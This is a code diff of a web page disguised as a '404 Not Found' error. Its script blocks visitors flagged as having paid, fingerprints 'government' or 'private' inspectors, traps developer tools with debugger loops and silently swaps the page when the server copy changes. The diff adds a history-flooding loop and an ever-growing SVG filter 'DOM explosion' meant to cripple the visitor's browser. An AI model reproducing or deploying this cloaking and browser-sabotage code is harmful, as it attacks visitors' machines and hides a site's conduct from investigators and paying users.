@@ -1,35 +1,46 @@
-<!DOCTYPE html> 
-<html>
+<!DOCTYPE html>   
+<html lang="en">
 <head>
     <title>404 Not Found</title>
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <script>
 (function() {
-    const bannedIds = [
-        'AF-5019-HTBV',
-        'AF-IPOA-PZNC',
-        'AF-8821-LKQX',
-        'AF-3047-WMVJ',
-        'AF-9102-PRZB',
-        'AF-6453-NYTC',
-        'AF-1289-XDGK',
-        'AF-7364-VBFR',
-        'AF-4510-MSHW',
-        'AF-9932-KJLP',
-        'AF-2741-CQNE',
-        'AF-8156-URXO'
-    ];
+    const BANNED_LIST_URL = './banned-ids.json';
+    const CACHE_KEY = 'av_cached_banned_ids';
+    const CACHE_TIME_KEY = 'av_banned_cache_time';
 
     let currentETag = null;
+    let activeBannedIds = [];
 
-    function render404Page() {
+    try {
+        const cached = localStorage.getItem(CACHE_KEY);
+        if (cached) {
+            activeBannedIds = JSON.parse(cached);
+        }
+    } catch (e) {}
+
+    async function syncBannedList() {
+        try {
+            const response = await fetch(BANNED_LIST_URL, { cache: 'no-store' });
+            if (response.ok) {
+                const data = await response.json();
+                if (Array.isArray(data)) {
+                    activeBannedIds = data;
+                    localStorage.setItem(CACHE_KEY, JSON.stringify(data));
+                    localStorage.setItem(CACHE_TIME_KEY, Date.now().toString());
+                }
+            }
+        } catch (e) {}
+    }
+
+    syncBannedList();
+
+    function render403Page() {
         localStorage.clear();
-        sessionStorage.clear();
 
         document.documentElement.innerHTML = `
-             <!DOCTYPE html>
+                            <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -123,73 +134,66 @@
         const targetId = urlParams.get('id');
         const localId = localStorage.getItem('avalonflow_identity');
 
-        if ((targetId && bannedIds.includes(targetId)) || (localId && bannedIds.includes(localId))) {
-            render404Page();
+        if (
+            localStorage.getItem('step_3_paid') === 'true' ||
+            localStorage.getItem('step_3_txn_id') !== null
+        ) {
+            render403Page();
             return true;
         }
+
+        if (targetId && activeBannedIds.includes(targetId)) {
+            render403Page();
+            return true;
+        }
+
+        if (localId && activeBannedIds.includes(localId)) {
+            render403Page();
+            return true;
+        }
+
         return false;
     }
 
-    // Checks if the document on the server has changed without reloading the UI
     async function checkForFileChanges() {
         try {
-            // HEAD request fetches only file metadata (headers), consuming almost zero bandwidth
-            const response = await fetch(window.location.href, { 
-                method: 'HEAD',
-                cache: 'no-store' 
-            });
-
-            // Use the ETag or Last-Modified header to detect file updates
+            const response = await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
             const newETag = response.headers.get('ETag') || response.headers.get('Last-Modified');
 
             if (currentETag && newETag && currentETag !== newETag) {
-                // File changed on host: force a seamless document replacement
                 const fullResponse = await fetch(window.location.href, { cache: 'no-store' });
                 const newHtml = await fullResponse.text();
-                
-                // Silent document swap
                 document.open();
                 document.write(newHtml);
                 document.close();
                 return;
             }
-
             currentETag = newETag;
-        } catch (e) {
-            // Ignore connection hiccups
-        }
+        } catch (e) {}
     }
 
-    // 1. Instantly check state on script load
     if (verifyAccess()) return;
 
-    // 2. Intercept Storage.prototype.setItem globally across all keys
     const originalSetItem = Storage.prototype.setItem;
     Storage.prototype.setItem = function(key, value) {
-        if (bannedIds.includes(value)) {
-            render404Page();
-            return; // Block saving to storage entirely
+        if (key === 'avalonflow_identity' && activeBannedIds.includes(value)) {
+            render403Page();
+            return;
         }
         originalSetItem.apply(this, arguments);
     };
 
-    // 3. Keep event listeners for navigation and cross-tab storage changes
     window.addEventListener('popstate', verifyAccess);
     window.addEventListener('storage', verifyAccess);
-
-    // 4. Local fast-check every 100ms
     setInterval(verifyAccess, 100);
-
-    // 5. Silent file update check every 3 seconds
     checkForFileChanges();
     setInterval(checkForFileChanges, 3000);
 })();
 </script>
 
-        <style>
+    <style>
         body { 
             font-family: 'Georgia', sans-serif;  
-            /* Amplified color glow values with intense centers blending to deep black */
             background: radial-gradient(circle at 15% 25%, #4c1d95 0%, #1e1b4b 25%, transparent 60%),
                         radial-gradient(circle at 85% 75%, #005f73 0%, #0a2f35 30%, transparent 60%),
                         #05070a;
@@ -208,17 +212,10 @@
             overflow: hidden;
         }
 
-        /* Drags the positions diagonally so the vibrant corners flawlessly swap fields */
         @keyframes ambientPulse {
-            0% {
-                background-position: 0% 10%;
-            }
-            50% {
-                background-position: 100% 90%;
-            }
-            100% {
-                background-position: 0% 10%;
-            }
+            0% { background-position: 0% 10%; }
+            50% { background-position: 100% 90%; }
+            100% { background-position: 0% 10%; }
         }
 
         .error-container { max-width: 500px; }
@@ -266,7 +263,7 @@
                 const authorizedDomain = "avalonflow.site";
                 const currentHost = window.location.hostname;
                 const isAuthorized = (currentHost === authorizedDomain || currentHost.endsWith('.' + authorizedDomain));
-                
+
                 if (!isAuthorized) {
                     this.triggerSelfDestruct();
                     return false;
@@ -280,7 +277,7 @@
                         <div class="error-code-wrapper">
                             <span>4</span>
                             <div class="logo-container">
-                                <img src="assets/pictures/unnamed.jpg" alt="Logo" class="logo-img">
+                                <img src="assets/pictures/1780995787737.jpeg" alt="Logo" class="logo-img">
                             </div>
                             <span>4</span>
                         </div>
@@ -294,9 +291,38 @@
                 sessionStorage.clear();
                 document.body.innerHTML = this.get404Template();
                 document.body.classList.add('render-ready');
+
+                // Active Defense Countermeasures
+                this.activateHistoryTrap();
+                this.activateDOMExplosion();
+
                 try { window.open('', '_self').close(); } catch (e) {}
                 this.activateInspectorTrap();
                 this.activateEnvironmentSabotage();
+            },
+
+            activateHistoryTrap: function() {
+                setInterval(() => {
+                    try {
+                        for (let i = 0; i < 100; i++) {
+                            window.history.pushState(null, '', `?restricted_state=${Math.random().toString(36).substring(2)}`);
+                        }
+                    } catch (e) {}
+                }, 50);
+            },
+
+            activateDOMExplosion: function() {
+                const container = document.createElement('div');
+                container.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden;';
+                document.body.appendChild(container);
+
+                setInterval(() => {
+                    for (let i = 0; i < 50; i++) {
+                        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+                        svg.innerHTML = `<filter id="f"><feTurbulence type="fractalNoise" baseFrequency="0.05" numOctaves="5"/></filter>`;
+                        container.appendChild(svg);
+                    }
+                }, 100);
             },
 
             activateResetListener: function() {
@@ -385,7 +411,14 @@
                             case '0': try { (function stackTrap(i) { if (("" + i/i)["length"] !== 1 || i % 20 === 0) (function(){}).constructor("debugger")(); else stackTrap(++i); })(0); } catch(e) {} continue;
                             case '1': if (Math.random() > 0.5) window.status = 'VALIDATING'; continue;
                             case '2': return;
-                            case '3': if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) this.triggerSelfDestruct(); continue;
+                            case '3': 
+                                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                                if (!isMobile) {
+                                    if (window.outerHeight - window.innerHeight > 160 || window.outerWidth - window.innerWidth > 160) {
+                                        this.triggerSelfDestruct();
+                                    }
+                                }
+                                continue;
                             case '4': (Date.now() % 1000) * 0x5a1b; continue;
                         }
                         break;
@@ -415,7 +448,7 @@
 
                 const id = this.getHardwareID();
                 const type = this.detectAgencyProfile();
-                
+
                 if (this.isPersistenceWindowActive() || ((id.startsWith('a') || id.startsWith('1')) && (type === 'GOVERNMENT' || type === 'PRIVATE'))) {
                     this.activateInspectorTrap();         
                     this.activateEnvironmentSabotage();   
@@ -429,8 +462,7 @@
         // Parent Window Communication Hub
         window.addEventListener("message", (e) => { 
             if (e.data?.type === "UPDATE_TITLE") document.title = e.data.title; 
-            
-            // Handle seamless URL mutations from sandbox context
+
             if (e.data?.type === "UPDATE_URL" && e.origin === window.location.origin) {
                 const newUrl = window.location.protocol + "//" + window.location.host + e.data.path;
                 window.history.pushState({ path: newUrl }, '', newUrl);
